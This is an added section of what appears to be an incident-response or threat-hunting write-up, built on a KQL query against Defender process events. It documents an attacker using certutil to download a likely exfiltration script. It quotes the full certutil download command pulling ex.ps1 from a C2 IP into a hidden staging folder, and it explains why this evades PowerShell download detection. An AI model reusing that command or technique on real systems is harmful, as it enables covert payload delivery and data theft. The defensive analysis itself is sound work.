@@ -358,3 +358,59 @@ bypassed.
 
 ---
 <br><br><br>
+# Query 9: Defense Evasion — Malicious Script Download
+
+A KQL query was executed against `DeviceProcessEvents` scoped to `azuki-fileserver01`,
+filtered to the window beginning at the confirmed logon time of `12:38 AM UTC on
+November 22, 2025`. The query filtered for processes where `InitiatingProcessCommandLine`
+contained `powershell.exe` and `ProcessCommandLine` contained `.ps1`, to identify
+any scripts downloaded or executed under PowerShell during the intrusion window.
+Results were sorted ascending by `TimeGenerated` to establish execution order.
+
+---
+
+## Key Findings
+
+The results confirm **one script download command** was executed on
+`azuki-fileserver01` at **`12:56:47 AM UTC on November 22, 2025`** — approximately
+**18 minutes after the attacker's logon** at `12:38:49 AM UTC`:
+
+1. `12:56:47 AM UTC` — `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
+
+<img width="686" height="218" alt="image" src="https://github.com/user-attachments/assets/3b6ea8c1-e8df-47cc-bd42-3609e7fc046f" />
+
+
+---
+
+## What This Reveals
+
+**`certutil -urlcache -f`** — a native Windows certificate utility that has been
+widely abused as a file downloader. The `-urlcache` flag accesses the URL cache
+and `-f` forces a fresh download, effectively turning `certutil.exe` into a
+fully functional HTTP file downloader without requiring PowerShell's
+`Invoke-WebRequest` or any third-party tooling. This technique is a well-known
+living-off-the-land method specifically chosen to avoid triggering detections that
+monitor PowerShell download cradles.
+
+**Source `http://78.141.196.6:7331/ex.ps1`** — the file was downloaded directly
+from the attacker's C2 server at `78.141.196.6`, the same IP observed throughout
+the intrusion in the `curl.exe` beacon activity. The port `7331` differs from the
+C2 beacon port `8880`, indicating the attacker operates a multi-port C2 server —
+`8880` for beacon and tasking traffic, `7331` as a file delivery endpoint.
+
+**Destination `C:\Windows\Logs\CBS\ex.ps1`** — the script was written directly
+into the staging directory already used to store the copied file share data and
+already marked hidden and system via `attrib +h +s`. Placing the script inside
+this directory keeps all attacker tooling consolidated in a single concealed
+location and ensures `ex.ps1` inherits the hidden and system attributes applied
+to the parent directory.
+
+**Script name `ex.ps1`** — the filename strongly suggests an exfiltration script.
+Given that the staging directory already contains copies of `Contracts`,
+`Financial`, `IT-Admin`, and `Shipping` share data, this script is very likely
+the mechanism the attacker deployed to transfer the staged data out of the
+environment to the C2 server — completing the collection-to-exfiltration chain.
+
+**MITRE ATT&CK:** `T1105` — Ingress Tool Transfer  
+**MITRE ATT&CK:** `T1140` — Deobfuscate/Decode Files or Information  
+**MITRE ATT&CK:** `T1059.001` — Command and Scripting Interpreter: PowerShell
